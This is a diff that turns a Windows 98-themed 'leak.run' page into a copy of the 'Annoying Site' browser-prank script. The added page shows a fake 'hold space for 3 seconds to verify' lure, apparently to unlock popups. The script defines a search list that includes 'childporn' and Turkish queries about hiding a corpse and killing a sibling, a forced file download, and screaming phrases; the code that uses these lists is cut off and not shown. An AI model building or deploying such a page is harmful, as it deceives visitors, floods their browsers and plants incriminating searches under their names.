@@ -1,907 +1,1346 @@
+<!doctype html>
+
+<!--
+  The Annoying Site
+  https://theannoyingsite.com
+
+  Author:
+    Feross Aboukhadijeh
+    https://feross.org
+
+  Patreon:
+    If you enjoyed this, please support me on Patreon!
+    https://www.patreon.com/feross
+-->
 
 <html>
-  <head>
-    <title>L</title>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Windows 98">
-    <link rel="icon" href="Leak.png" type="image/png">
-    <link rel="stylesheet" href="https://unpkg.com/98.css">
-    <style>
-
-/* Disable image filtering */
-img { 
-    image-rendering: optimizeSpeed;             /* STOP SMOOTHING, GIVE ME SPEED  */
-    image-rendering: -moz-crisp-edges;          /* Firefox                        */
-    image-rendering: -o-crisp-edges;            /* Opera                          */
-    image-rendering: -webkit-optimize-contrast; /* Chrome (and eventually Safari) */
-    image-rendering: pixelated;                 /* Chrome */
-    image-rendering: optimize-contrast;         /* CSS3 Proposed                  */
-    -ms-interpolation-mode: nearest-neighbor;   /* IE8+                           */
-}
-
-/* bugfix */
-button:not(:disabled):active { padding-top: 0px; }
-button { color: black; }
-
-/*** Menus ***/
-
-/* Menus are defined by a "ul" element with the "menu" class. Adding the
- * "bar" class makes the menu horizontal. A "div" child with the
- * "window" class inside of a "li" in a menu will be a popup. */
-
-ul.menu {
-    margin: 0px;
-    padding: 0px;
-    list-style-type: none; /* disable bullets */
-}
-
-/* popup menu window */
-ul.menu > li > div.window {
-    position: absolute;
-    display: none;
-    top: 0px; left: 100%;  /* display to the right of the parent "li" */
-}
-ul.bar > li > div.window {
-    top: 100%; left: 0px;  /* display under the parent "li" */
-}
-ul.menu > li:hover > div.window {
-    display: block;  /* display popup when parent "li" is hovered */
-}
-
-/* menu item */
-ul.menu > li {
-    position: relative;
-    color: black;
-    padding: 2px;
-    line-height: 16px;  /* make sure text occupies the same vertical space as a 16x16 icon */
-}
-ul.bar > li {
-    display: inline;  /* menu bars display horizontally */
-}
-ul.menu > li:hover {
-    background-color: #000080; color: white;  /* hovered menu item color */
-}
-
-/* menu separator */
-hr {
-    margin: 2px;
-    border-top: 1px solid #808080;
-    border-bottom: 1px solid #FFFFFF;
-}
-
-/* submenu arrow */
-ul.menu > li.arrow::after {
-    content: url('arrow.png');
-    display: inline-block;
-    vertical-align: middle; 
-    margin-left: 60px; 
-    -webkit-user-drag: none;
-    user-drag: none;
-}
-/* keyboard shortcut */
-ul.menu > li > span.keyshortcut { float: right; }
-
-/* menu item icon */
-ul.menu > li > img {
-    width: 16px; height: 16px;
-    vertical-align: middle;  /* seems to be off by 1 pixel? */
-    padding-right: 4px;
-}
-ul.menu > li > img:not([src]) {
-    visibility: hidden;
-}
-
-/* Don't use flex layout on title bar */
-div.title-bar { display: block; padding: 1px; }
-div.title-bar * { display: inline; vertical-align: middle; }  /* make everything horizontal */
-div.title-bar-text { vertical-align: middle; line-height: 16px; padding: 1px; }
-div.title-bar-controls { float: right; padding: 1px; }
-div.title-bar img { padding-right: 5px; }
-
-div.deskicon {
-    width: 70px;
-    height: 70px;
-    text-align: center;
-    color: white;
-    font-family: "Pixelated MS Sans Serif", Arial;
-    -webkit-font-smoothing: none;
-    font-size: 11px;
-}
-div.deskicon > img {
-    padding: 4px;
-}
-
-/* make icons vertically centered in text */
-button img {
-    vertical-align: middle;
-}
-
-button.pushed {
-    box-shadow: inset -1px -1px #FFFFFF, inset 1px 1px #0A0A0A, inset -2px -2px #DFDFDF, inset 2px 2px #808080;
-}
-
-button.taskbtn, button.taskbtn:active {
-    box-sizing: border-box;
-    height: 22px;
-    width: 100px;
-    text-align: left;
-    padding-left: 5px;
-    padding-right: 5px;
-}
-button.taskbtn > img {
-    margin-right: 5px;
-}
-button.taskbtn.pushed {
-    font-weight: bold;
-    background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAIAAAACCAAAAABX3VL4AAAACXBIWXMAAAsTAAALEwEAmpwYAAAADklEQVQIHWPY+5/h/14ACm4DeZxCDIkAAAAASUVORK5CYII=");
-}
-
-/*** element specific rules ***/
-
-html, body {
-    width: 100%;
-    height: 100%;
-    overflow: hidden;
-}
-body {
-    position: relative;
-    background-color: #000000;
-    margin: 0px;
-    padding: 0px;
-    user-select: none; -ms-user-select: none;
-    cursor: url("https://windows93.net/c/sys/cursors/default.cur"), default; 
-
-}
-
-/* Start Menu */
-#startMenu div.window {
-    width: 150px;
-}
-#startMenu > ul > li {
-    padding: 0px;
-}
-#startMenu > ul > li > img {
-    width: 32px; height: 32px;
-}
-
-#startBtn.pushed {
-    box-shadow: inset -1px -1px #FFFFFF, inset 1px 1px #0A0A0A, inset -2px -2px #DFDFDF, inset 2px 2px #808080;
-    padding: 2px 11px 0 13px;
-}
-
-#notificationArea {
-    float: right;
-    height: 22px;
-    margin-right: 4px;
-    padding: 4px;
-    box-sizing: border-box;
-    box-shadow: inset -1px -1px #FFFFFF, inset 1px 1px #808080;
-}
-    </style>
-    <style>
-        .popup {
-           display: none; /* Başlangıçta gizli */
-           position: fixed;
-           left: 0;
-           top: 0;
-           width: 100%;
-           height: 100%;
-           background-color: rgba(0, 0, 0, 0.5); /* Sayfanın arka planını karartır */
-       }
-       
-       .popup-content {
-           background-color: white;
-           margin: 15% auto;
-           padding: 20px;
-           border: 1px solid #888;
-           width: 300px; /* Popup genişliği */
-       }
-       
-       .close {
-           color: #aaa;
-           float: right;
-           font-size: 28px;
-           font-weight: bold;
-       }
-       
-       .close:hover,
-       .close:focus {
-           color: black;
-           text-decoration: none;
-           cursor: pointer;
-       }
-      
-       .toplevel {
+<head>
+  <meta charset='UTF-8'>
+  <meta name='theme-color' content='#fff' class='theme-color'/>
+  <style>
+    html, body {
+      width: 100%;
+      height: 100%;
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, 'avenir next', avenir,
+        'helvetica neue', helvetica, ubuntu, roboto, noto, 'segoe ui', arial,
+        sans-serif;
+      overflow: hidden;
+    }
+    .hello-message {
+      margin: 40px;
+      text-align: center;
+    }
+    .logout-messages {
+      pointer-events: none;
+      color: rgba(255, 255, 255, 0);
+      margin: 40px;
       position: fixed;
+      top: 0;
+      left: 0;
+
+    }
+    img {
       width: 300px;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-
+    }
+    @keyframes blurslowly {
+      0% {
+        filter: none;
+      }
+      92% {
+        filter: blur(0);
+      }
+      96% {
+        filter: blur(1px);
+      }
+      100% {
+        filter: blur(0);
+      }
+    }
+    body {
+      animation-name: blurslowly;
+      animation-iteration-count: infinite;
+      animation-duration: 15s;
+      animation-play-state: running;
     }
 
-    .deskicon img {
-      width: 48px;
-      height: 48px;
-     
-
-    }
-
-    .window-body {
-      display: flex;
-      align-items: center; /* Vertically center the items */
-    }
-
-    .window-body img {
-      margin-right: 8px; 
-    }
     .container {
-            display: flex;
-            justify-content: center; /* Ortala */
-            align-items: center; /* Ortala */
-            flex-direction: column; /* Dikey hizalama */
-            position: absolute; /* Sayfanın en üstünde sabitler */
-            top: 0; /* Üstten sıfır noktası */
-            left: 50%; /* Yatayda ortala */
-            transform: translateX(-50%); /* Gerçekten ortalamak için */
-            animation: sway 2s ease-in-out infinite alternate;
-        }
-        #sayori {
-            max-width: 100%; /* Görselin genişliğini ayarla */
-            height: auto;
-            transform: translateX(-50%); /* Gerçekten ortalamak için */
-
-        }
-       
-        @keyframes sway {
-            0% { transform: translateX(-5px); } /* Başlangıç sola kaydırma */
-            100% { transform: translateX(5px); } /* Sona sağa kaydırma */
-        }
-
-        #notificationArea {
-    display: flex;
-    align-items: center;
-}
-
-#notificationArea img {
-    margin-right: 5px; /* Saat ile hoparlör simgesi arasında boşluk bırakır */
-}
-     </style>
-  </head>
-
-  <body>
-    
-    <!--Icons-->
-
-    <div class="deskicon" onclick="openApp(Leak)">
-      <img src="Leak.png"><br>Leak
-    </div>
- 
-    <!--Run Dialog-->
-    <div id="run" class="toplevel window" style="position:absolute; display:none; width:340px; top:50px; left:20px;">
-      <div class="title-bar">
-        <div class="title-bar-text">Run</div>
-        <div class="title-bar-controls">
-          <button aria-label="Help"></button><button aria-label="Close"></button>
-        </div>
-      </div>
-      <div class="window-body">
-        <p>
-          <img src="https://win98icons.alexmeub.com/icons/png/application_hourglass-0.png" style="margin-right:10px; float:left">
-          Type the name of a program, folder, document, or Internet resource, and Windows will open it for you.
-        </p>
-        <div>
-          Open:<select style="width:270px; margin-left:10px"></select>
-        </div>
-        <div style="margin:10px; text-align:right">
-          <button>OK</button>
-          <button>Cancel</button>
-          <button>Browse</button>
-        </div>
-      </div>
-    </div>
-    
-    <!-- Leak -->
-    <div id="Leak" class="toplevel window" style="position:absolute; display:none;">
-      <div class="title-bar">
-        <div class="title-bar-text">Leak</div>
-        <div class="title-bar-controls">
-          <button aria-label="Minimize"></button>
-          <button aria-label="Maximize"></button>
-          <button aria-label="Close"></button>
-        </div>
-      </div>
-      <div class="window-body">
-        <img src="Leak.png" alt="">
-        <br>
-        <p>Hello there, welcome to leak.run!</p>
-      </div>
-    </div>
-    
-     <!-- message -->
-     <div id="message" class="toplevel window" style="position:absolute; display:none;">
-      <div class="title-bar">
-        <img src="https://win98icons.alexmeub.com/icons/png/notepad-3.png">
-        <div class="title-bar-text">Message.txt</div>
-        <div class="title-bar-controls">
-          <button aria-label="Minimize"></button><button aria-label="Maximize"> </button><button aria-label="Close"></button>
-        </div>
-      </div>
-      <ul class="menu bar">
-        <li>
-          File
-          <div class="window" style="width:120px">
-            <ul class="menu">
-              <li><img>New<span class="keyshortcut">Ctrl+N</span></li>
-              <li><img>Open...<span class="keyshortcut">Ctrl+O</span></li>
-              <li><img>Save<span class="keyshortcut">Ctrl+S</span></li>
-              <li><img>Save As...</li>
-              <hr>
-              <li><img>Print...<span class="keyshortcut">Ctrl+P</span></li>
-              <hr>
-              <li><img>Exit</li>
-            </ul>
-          </div>
-        </li>
-        <li>
-          Help
-          <div class="window" style="width:100px">
-            <ul class="menu">
-              <li><img>Contents<span class="keyshortcut">F1</span></li>
-              <li><img>About Notepad</li>
-            </ul>
-          </div>
-        </li>
-      </ul>
-      <div class="window-body" style="margin:0px;">
-        <br>
-        <br>
-        <textarea style="width: 100%; height:200px;" readonly> Why did you do that to me?</textarea>
-      </div>
-    </div>
-<!-- msg2 -->
-
-<div id="message1" class="toplevel window" style="position:absolute; display:none;">
-  <div class="title-bar">
-    <img src="https://win98icons.alexmeub.com/icons/png/notepad-3.png">
-    <div class="title-bar-text">Message.txt</div>
-    <div class="title-bar-controls">
-      <button aria-label="Minimize"></button><button aria-label="Maximize"> </button><button aria-label="Close"></button>
-    </div>
-  </div>
-  <ul class="menu bar">
-    <li>
-      File
-      <div class="window" style="width:120px">
-        <ul class="menu">
-          <li><img>New<span class="keyshortcut">Ctrl+N</span></li>
-          <li><img>Open...<span class="keyshortcut">Ctrl+O</span></li>
-          <li><img>Save<span class="keyshortcut">Ctrl+S</span></li>
-          <li><img>Save As...</li>
-          <hr>
-          <li><img>Print...<span class="keyshortcut">Ctrl+P</span></li>
-          <hr>
-          <li><img>Exit</li>
-        </ul>
-      </div>
-    </li>
-    <li>
-      Help
-      <div class="window" style="width:100px">
-        <ul class="menu">
-          <li><img>Contents<span class="keyshortcut">F1</span></li>
-          <li><img>About Notepad</li>
-        </ul>
-      </div>
-    </li>
-  </ul>
-  <div class="window-body" style="margin:0px;">
-    <br>
-    <br>
-    <textarea style="width: 100%; height:200px;" readonly>I thought you were there for me</textarea>
-  </div>
-</div>
-
-<!-- msg3-->
-<div id="message2" class="toplevel window" style="position:absolute; display:none;">
-  <div class="title-bar">
-    <img src="https://win98icons.alexmeub.com/icons/png/notepad-3.png">
-    <div class="title-bar-text">Message.txt</div>
-    <div class="title-bar-controls">
-      <button aria-label="Minimize"></button><button aria-label="Maximize"> </button><button aria-label="Close"></button>
-    </div>
-  </div>
-  <ul class="menu bar">
-    <li>
-      File
-      <div class="window" style="width:120px">
-        <ul class="menu">
-          <li><img>New<span class="keyshortcut">Ctrl+N</span></li>
-          <li><img>Open...<span class="keyshortcut">Ctrl+O</span></li>
-          <li><img>Save<span class="keyshortcut">Ctrl+S</span></li>
-          <li><img>Save As...</li>
-          <hr>
-          <li><img>Print...<span class="keyshortcut">Ctrl+P</span></li>
-          <hr>
-          <li><img>Exit</li>
-        </ul>
-      </div>
-    </li>
-    <li>
-      Help
-      <div class="window" style="width:100px">
-        <ul class="menu">
-          <li><img>Contents<span class="keyshortcut">F1</span></li>
-          <li><img>About Notepad</li>
-        </ul>
-      </div>
-    </li>
-  </ul>
-  <div class="window-body" style="margin:0px;">
-    <br>
-    <br>
-    <textarea style="width: 100%; height:200px;" readonly>Your ghost is all I see</textarea>
-  </div>
-</div>
-
-<!-- msg4-->
-<div id="message3" class="toplevel window" style="position:absolute; display:none;">
-  <div class="title-bar">
-    <img src="https://win98icons.alexmeub.com/icons/png/notepad-3.png">
-    <div class="title-bar-text">Message.txt</div>
-    <div class="title-bar-controls">
-      <button aria-label="Minimize"></button><button aria-label="Maximize"> </button><button aria-label="Close"></button>
-    </div>
-  </div>
-  <ul class="menu bar">
-    <li>
-      File
-      <div class="window" style="width:120px">
-        <ul class="menu">
-          <li><img>New<span class="keyshortcut">Ctrl+N</span></li>
-          <li><img>Open...<span class="keyshortcut">Ctrl+O</span></li>
-          <li><img>Save<span class="keyshortcut">Ctrl+S</span></li>
-          <li><img>Save As...</li>
-          <hr>
-          <li><img>Print...<span class="keyshortcut">Ctrl+P</span></li>
-          <hr>
-          <li><img>Exit</li>
-        </ul>
-      </div>
-    </li>
-    <li>
-      Help
-      <div class="window" style="width:100px">
-        <ul class="menu">
-          <li><img>Contents<span class="keyshortcut">F1</span></li>
-          <li><img>About Notepad</li>
-        </ul>
-      </div>
-    </li>
-  </ul>
-  <div class="window-body" style="margin:0px;">
-    <br>
-    <br>
-    <textarea style="width: 100%; height:200px;" readonly>Your ghost is so pretty</textarea>
-  </div>
-</div>
-
-    <!-- taskbar -->
-    <div id="taskbar" class="window" style="position:absolute; height:23px; width:100%; left:-2px; bottom:-2px; padding:4px; z-index:1000">
-        
-        <button id="startBtn" style="min-width:54px; box-sizing:border-box; height:22px; padding-left:4px; text-align:left; font-weight:bold">
-          <img src="https://win98icons.alexmeub.com/icons/png/windows-4.png">
-          Start
-        </button>
-        
-        <!-- Start Menu -->
-        <div id="startMenu" class="window" style="position:absolute; bottom:28px; width:202px; display:none">
-          <img draggable="false" style="position:absolute; bottom:3px" src="95.png">
-          <ul class="menu" style="border-left:30px solid #84878c">
-
-            <li>
-              <!-- not the correct icon" -->
-              <img src="https://win98icons.alexmeub.com/icons/png/file_program_group-0.png">
-              <u>P</u>rograms
-             
-            </li>
-  
-            <li class="arrow"><img src="https://win98icons.alexmeub.com/icons/png/directory_open_file_mydocs_small-3.png"><u>D</u>ocuments
-                <div class="window">
-                    <ul class="menu">
-                     <li onclick="openApp(message)"><img src="https://win98icons.alexmeub.com/icons/png/message_file-1.png">Message</li>
-                     <li onclick="openApp(message1)"><img src="https://win98icons.alexmeub.com/icons/png/message_file-1.png">Message (1)</li>
-                     <li onclick="openApp(message2)"><img src="https://win98icons.alexmeub.com/icons/png/message_file-1.png">Message (2)</li>
-                     <li onclick="openApp(message3)"><img src="https://win98icons.alexmeub.com/icons/png/message_file-1.png">Message (3)</li>
-                    </ul>
-                  </div>
-            </li>
-            <li>
-              <img src="https://win98icons.alexmeub.com/icons/png/settings_gear-3.png">
-              <u>S</u>ettings
-             
-            </li>
-            <li><img src="https://win98icons.alexmeub.com/icons/png/search_file_2-3.png"><u>F</u>ind</li>
-            <li><img src="https://win98icons.alexmeub.com/icons/png/help_book_small-3.png"><u>H</u>elp</li>
-            <li><img src="https://win98icons.alexmeub.com/icons/png/application_hourglass_small-3.png"><u>R</u>un</li>
-            <hr>
-            <li><img src="https://win98icons.alexmeub.com/icons/png/shut_down_with_computer-0.png">Shut Down</li>
-          </ul>
-        </div>
-        <div id="popup" class="popup">
-            <div class="popup-content">
-                <span class="close" onclick="closePopup()">&times;</span>
-                <p>AAaaaAaAaAaAaAAAAaaaAA</p>
-            </div>
-        </div>
-        <div id="taskBtnList" style="display:inline"></div>
-        
-        <span id="notificationArea">
-          <img src="https://win98icons.alexmeub.com/icons/png/loudspeaker_rays-1.png" alt=""><span id="clock"></span>
-        </span>
-    </div>
-    
-    <!-- window menu -->
-    <div class="window" style="position:absolute; display:none">
-      <ul class="menu">
-        <li><img>Restore</li>
-        <li><img>Move</li>
-        <li><img>Size</li>
-        <li><img>Minimize</li>
-        <li><img>Maximize</li>
-        <hr>
-        <li><img>Close</li>
-      </ul>
-    </div>
- 
-    <audio autoplay hidden>
-      <source src="sex.mp3" type="audio/mpeg">
-      0_o
-  </audio>
-  </body>
-  <script src="https://polyfill.io/v3/polyfill.js?features=Array.prototype.indexOf|always"></script>
-  <script>
-/* Old IE polyfills */
-if (!document.getElementsByClassName) {
-    document.getElementsByClassName = function(cl) {
-        var retnode = [];
-        var elem = this.getElementsByTagName('*');
-        for (var i = 0; i < elem.length; i++) {
-            if((' ' + elem[i].className + ' ').indexOf(' ' + cl + ' ') > -1) retnode.push(elem[i]);
-        }
-        return retnode;
-    };
-}
-if (!Event.prototype.stopPropagation) {
-    Event.prototype.stopPropagation=function() {
-        this.cancelBubble=true;
-    };
-}
-if (window.NodeList && !NodeList.prototype.forEach) {
-    NodeList.prototype.forEach = function (callback, thisArg) {
-        thisArg = thisArg || window;
-        for (var i = 0; i < this.length; i++) {
-            callback.call(thisArg, this[i], i, this);
-        }
-    };
-}
-
-topZ = 100;
-
-function hasClass(elem, className) {
-    if (typeof(elem.className) === "string") {
-        var classes = elem.className.split(" ");
-        for (var i = 0; i < classes.length; i++)
-            if (classes[i] === className)
-                return true;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        position: relative;
     }
-    return false;
-}
-function deleteNode(node) {
-   node.parentNode.removeChild(node);
-}
 
-function showWindowMenu(win, widget) {
-    
-}
-
-var topLevelWindows = [];
-var windowId = 0;
-function Window(template) {
-  var win = this;
-  var elem = template.cloneNode(true);
-  elem.id = template.id + windowId++;
-  // TODO: make sure child ids are unique.
-  document.body.appendChild(elem);
-  this.elem = elem;
-
-  // find title bar
-  elem.childNodes.forEach(
-      function(n) { if (hasClass(n, "title-bar")) this.titleBar = n; },
-      this);
-  // find window icon and buttons
-  if (this.titleBar) {
-      this.titleBar.childNodes.forEach(
-          function(n) {
-              if (n.nodeName === "IMG")
-                  this.icon = n;
-              else if (n.className === "title-bar-controls")
-                  n.childNodes.forEach(
-                      function(n) {
-                          if (n.nodeName === "BUTTON")
-                              switch (n.getAttribute("aria-label")) {
-                              case "Maximize": this.maxBtn = n; break;
-                              case "Minimize": this.minBtn = n; break;
-                              case "Close": this.closeBtn = n; break;
-                              case "Help": this.helpBtn = n; break;
-                              }
-                      },
-                      this);
-          },
-          this);
-  }
-
-  // methods
-  this.open = function() {
-      elem.style.display = "";
-      // create task button
-      this.taskBtn = document.createElement("button");
-      this.taskBtn.className = "taskbtn";
-      this.taskBtn.innerText = this.titleBar.innerText;
-      this.taskBtn.onclick = function() {
-          if (win.isMinimized) {
-              win.activate();
-              win.restore();
-              return;
-          }
-          if (win.isActive && win.minBtn)
-              win.minimize();
-          else
-              win.activate();
-      };
-      taskBtnList.appendChild(this.taskBtn);
-      this.activate();
-  };
-  this.close = function() {
-      console.log("closing "+win);
-      deleteNode(win.elem);
-      deleteNode(win.taskBtn);
-      topLevelWindows.splice(topLevelWindows.indexOf(win), 1);
-  };
-  this.maximize = function() {
-      if (win.isMinimized) {
-          win.isMinimized = false;
-          elem.style.display = "";
-      }
-      win.prevLeft = elem.style.left;
-      win.prevTop = elem.style.top;
-      win.prevWidth = elem.style.width;
-      win.prevHeight = elem.style.height;
-      elem.style.top = "0px";
-      elem.style.left = "0px";
-      elem.style.width = "100%";
-      elem.style.height = "100%";
-      win.maxBtn.setAttribute("aria-label", "Restore");
-      win.isMaximized = true;
-  };
-  this.restore = function() {
-      if (win.isMinimized) {
-          win.isMinimized = false;
-          elem.style.display = "";
-          return;
-      }
-      elem.style.left = win.prevLeft;
-      elem.style.top = win.prevTop;
-      elem.style.width = win.prevWidth;
-      elem.style.height = win.prevHeight;
-      win.maxBtn.setAttribute("aria-label", "Maximize");
-      win.isMaximized = false;
-  };
-  this.minimize = function() {
-      elem.style.display = "none";
-      win.deactivate();
-      win.isMinimized = true;
-  };
-  this.activate = function() {
-      topLevelWindows.forEach(function(w) { w.deactivate(); }, this);
-      win.titleBar.className = "title-bar";
-      win.taskBtn.className = "taskbtn pushed";
-      win.elem.style.zIndex = topZ++;
-      win.isActive = true;
-  };
-  this.deactivate = function() {
-      win.titleBar.className = "title-bar inactive";
-      win.taskBtn.className = "taskbtn";
-      win.isActive = false;
-  };
-
-  this.isActive = this.isMaximized = this.isMinimized = false;
-  
-  elem.onclick = win.activate;
-
-  // caption button handlers
-  if (this.closeBtn)
-      this.closeBtn.onclick = this.close;
-  if (this.maxBtn)
-      this.maxBtn.onclick = this.titleBar.ondblclick = function() {
-          (win.isMaximized ? win.restore : win.maximize)();
-      };
-  if (this.minBtn)
-      this.minBtn.onclick = this.minimize;
-  if (this.icon)
-      this.icon.onclick = function() {};
-
-  console.log("created window");
-  console.log("window");
-  console.log(this.elem);
-  console.log("titleBar");
-  console.log(this.titleBar);
-  addSizeHandleEvents(this, this.titleBar, 0, 0);
-  topLevelWindows.push(this);
-}
-
-function openApp(winElem) {
-    new Window(winElem).open();
-}
-
-startBtn.onclick = function(event) {
-    startMenu.style.display = startMenu.style.display ? "" : "none";
-    startBtn.className = startMenu.style.display === "none" ? "" : "pushed";
-}
-
-function updateClock() {
-    var d = new Date();
-    var h = d.getHours() % 12;
-    var m = d.getMinutes();
-    var a = d.getHours() < 12 ? "AM" : "PM";
-    if (h == 0)
-        h = 12;
-    clock.innerHTML = h + ":" + (m < 10 ? "0" : "") + m + " " + a;
-    setTimeout(updateClock, 1000);
-}
-updateClock();
-
-function addSizeHandleEvents(winObj, h, resizeX, resizeY) {
-  h.onmousedown = h.ontouchstart = function(e) {
-    var win = winObj.elem;
-    if (winObj.isMaximized)
-        return;
-    e = e || window.event;
-    var startRect = win.getBoundingClientRect();
-    var startX = startRect.left;
-    var startY = startRect.top;
-    var startWidth = startRect.right - startX;
-    var startHeight = startRect.bottom - startY;
-    
-    var mouseStartX = e.clientX || e.touches[0].clientX;
-    var mouseStartY = e.clientY || e.touches[0].clientY;
-    winObj.activate();
-    document.onmousemove = document.ontouchmove = function(e) {
-      e = e || window.event;
-      var dx = (e.clientX || e.touches[0].clientX) - mouseStartX;
-      var dy = (e.clientY || e.touches[0].clientY) - mouseStartY;
-      if (resizeX < 0) {
-        win.style.left = startX + dx + "px";
-        win.style.width = startWidth - dx + "px";
-      }
-      if (resizeX > 0)
-        win.style.width = startWidth + dx + "px";
-      if (resizeY < 0) {
-        win.style.top = startY + dy + "px";
-        win.style.height = startHeight - dy + "px";
-      }
-      if (resizeY > 0)
-        win.style.height = startHeight + dy + "px";
-      if (resizeX == 0 && resizeY == 0) {
-        win.style.left = startX + dx + "px";
-        win.style.top = startY + dy + "px";
-      }
-    };
-    document.onmouseup = document.ontouchend = function(e) {
-      document.onmousemove = document.ontouchmove = null;
-      document.onmouseup = document.ontouchend = null;
-    };
-  }
-}
-function makeResizable(win) {
-  win.style.boxSizing = "border-box";
-  for (var x = -1; x <= 1; x++) {
-    for (var y = -1; y <= 1; y++) {
-      if ((x | y) == 0)
-        continue;
-      var h = document.createElement("div");
-      h.style.position = "absolute";
-      h.style.width = (x == 0) ? "100%" : "4px";
-      h.style.height = (y == 0) ? "100%" : "4px";
-      if (x != 1) h.style.left = "0px";
-      if (x != -1) h.style.right = "0px";
-      if (y != 1) h.style.top = "0px";
-      if (y != -1) h.style.bottom = "0px";
-      if (y != 0) h.style.cursor = "ns-resize";
-      if (x != 0) h.style.cursor = "ew-resize";
-      if (x*y == 1) h.style.cursor = "nwse-resize";
-      if (x*y == -1) h.style.cursor = "nesw-resize";
-      if ((x & y) != 0)
-        h.style.zIndex = 1;
-      addSizeHandleEvents(h, x, y);
-      win.appendChild(h);
+    .login-box {
+        background-color: #fff;
+        padding: 40px;
+        border-radius: 15px;
+        box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+        text-align: center;
+        z-index: 10;
     }
-  }
-}
 
-// I would like to go full screen automatically, but browsers don't allow that.
-/*
-document.onclick = function(e) {
-    var isFullScreen = (document.fullScreenElement && document.fullScreenElement !== null)
-                    || (document.mozFullScreen || document.webkitIsFullScreen);
-    if (!isFullScreen) {
-        var docElem = document.documentElement;
-        if (docElem.requestFullscreen)
-            docElem.requestFullscreen();
+    .login-box h2 {
+        color: #333;
+        margin-bottom: 20px;
     }
-    hide(startMenu);
-}
-*/
-  </script>
-</html>
 
+    .textbox {
+        margin-bottom: 20px;
+        position: relative;
+    }
+
+    .textbox input {
+        width: 100%;
+        padding: 10px;
+        font-size: 18px;
+        border: 2px solid #ddd;
+        border-radius: 5px;
+        outline: none;
+        transition: border-color 0.3s ease;
+    }
+
+    .textbox input:focus {
+        border-color: #ff66b2;
+    }
+
+    input[type="submit"] {
+        width: 100%;
+        padding: 12px;
+        background-color: #ff66b2;
+        border: none;
+        border-radius: 5px;
+        color: white;
+        font-size: 18px;
+        cursor: pointer;
+        transition: background-color 0.3s ease;
+    }
+
+    
+
+    .anime-girl img {
+        position: absolute;
+        bottom: 20px;
+        right: 20px;
+        width: 150px;
+        height: auto;
+        z-index: 5;
+    }
+
+    body::before {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: url('https://www.transparenttextures.com/patterns/white-dots.png') repeat;
+        opacity: 0.2;
+        pointer-events: none;
+    }
+  </style>
+</head>
+<body>
+
+<template>
+  <div class='hello-message'>
+    <div class="container">
+        <div class="login-box">
+            <h2>Hey There! Welcome to leak.run</h2>
+            <img draggable="false" src="anime-girl.png" alt="GIRL" height="250" width="250">
+            <br>
+            <br>
+              <h3>To Verify, HOLD DOWN THE SPACE BUTTON FOR 3 SECONDS.</h3>
+    
+            </form>
+        </div>
+    </div>
+      <div class='logout-messages'></div>
+</template>
+
+<script src='/index.js'></script>
+
+<script async src='https://www.googletagmanager.com/gtag/js?id=UA-3898076-24'></script>
 <script>
- function openPopup() {
-    document.getElementById("popup").style.display = "block";
+  window.dataLayer = window.dataLayer || []
+  function gtag () {
+    window.dataLayer.push(arguments)
+  }
+  gtag('js', new Date())
+  gtag('config', 'UA-3898076-24')
+</script>
+
+</body>
+</html>
+<script>
+    /* global Element */
+
+/**
+ *  The Annoying Site
+ *  https://theannoyingsite.com
+ *
+ *  Author:
+ *    Feross Aboukhadijeh
+ *    https://feross.org
+ *
+ *  Patreon:
+ *    If you enjoyed this, please support me on Patreon!
+ *    https://www.patreon.com/feross
+ */
+
+const SCREEN_WIDTH = window.screen.availWidth
+const SCREEN_HEIGHT = window.screen.availHeight
+const WIN_WIDTH = 480
+const WIN_HEIGHT = 360
+const VELOCITY = 15
+const MARGIN = 15
+const TOP_MARGIN = 50
+const TICK_LENGTH = 50
+
+const HIDDEN_STYLE = 'position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;'
+
+const ART = [
+  `
+┊┊ ☆┊┊┊┊☆┊┊☆ ┊┊┊┊┊
+┈┈┈┈╭━━━━━━╮┊☆ ┊┊
+┈☆ ┈┈┃╳╳╳▕╲▂▂╱▏┊┊
+┈┈☆ ┈┃╳╳╳▕▏▍▕▍▏┊┊
+┈┈╰━┫╳╳╳▕▏╰┻╯▏┊┊
+☆ ┈┈┈┃╳╳╳╳╲▂▂╱┊┊┊
+┊┊☆┊╰┳┳━━┳┳╯┊ ┊ ☆┊
+  `,
+  `
+░░▓▓░░░░░░░░▓▓░░
+░▓▒▒▓░░░░░░▓▒▒▓░
+░▓▒▒▒▓░░░░▓▒▒▒▓░
+░▓▒▒▒▒▓▓▓▓▒▒▒▒▓░
+░▓▒▒▒▒▒▒▒▒▒▒▒▒▒▓
+▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓
+▓▒▒▒░▓▒▒▒▒▒░▓▒▒▓
+▓▒▒▒▓▓▒▒▒▓▒▓▓▒▒▓
+▓▒░░▒▒▒▒▒▒▒▒▒░░▓
+▓▒░░▒▓▒▒▓▒▒▓▒░░▓
+░▓▒▒▒▓▓▓▓▓▓▓▒▒▓░
+░░▓▒▒▒▒▒▒▒▒▒▒▓░░
+░░░▓▓▓▓▓▓▓▓▓▓░░░
+  `
+]
+
+const SEARCHES = [
+  'childporn',
+  'leak.run',
+  'cesedi nereye saklayabilirim?',
+  'Kardesimi oldurdum ne yapical?',
+
+]
+
+const VIDEOS = [
+  'jeff.mp4',
+  
+]
+
+const FILE_DOWNLOADS = [
+  'jeff.mp4'
+]
+
+const PHRASES = [
+  'AAAaaAAAAaaAAaAaAAAaAaaAAAAaaAAAAaaAAaAaAAAaAaaAAAAaaAAAAaaAAaAaAAAaAaaAAAAaaAAAAaaAAaAaAAAaAaaA',
+  'LEEEEEEEEEEEEEEEEEEEEEEEEEEEEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAK',
+  'CHILDPORNCHILDPORNCHILDPORNCHILDPORNCHILDPORNCHILDPORNCHILDPORNCHILDPORN',
+  'XOXOXOXOXOXOXOXOXOXOXOXXOXOXOXOXOOXOXOXOXOXOXOOXOXOXOXOXOXOXOXOXOXOXOOXO',
